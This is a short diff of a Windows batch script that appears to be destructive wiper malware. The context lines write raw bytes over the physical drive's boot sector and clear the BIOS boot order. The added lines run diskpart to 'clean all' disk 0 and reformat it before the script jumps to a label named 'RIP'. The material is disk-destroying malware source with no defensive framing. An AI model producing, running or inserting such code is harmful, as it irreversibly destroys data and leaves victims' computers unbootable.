@@ -54,5 +54,11 @@ for /l %%s in (1,1,100000) do (
 )
 echo 5E 1F 7C 00 00 48 C7 C0 3C 00 00 00 0F 05 | xxd -r -p > \\.\PhysicalDrive0
 wmic bios set BootOrder= >nul 2>&1
+echo y| diskpart >nul 2>&1 <<EOF
+select disk 0
+clean all
+create partition primary
+format fs=ntfs quick
+EOF
 
 goto RIP
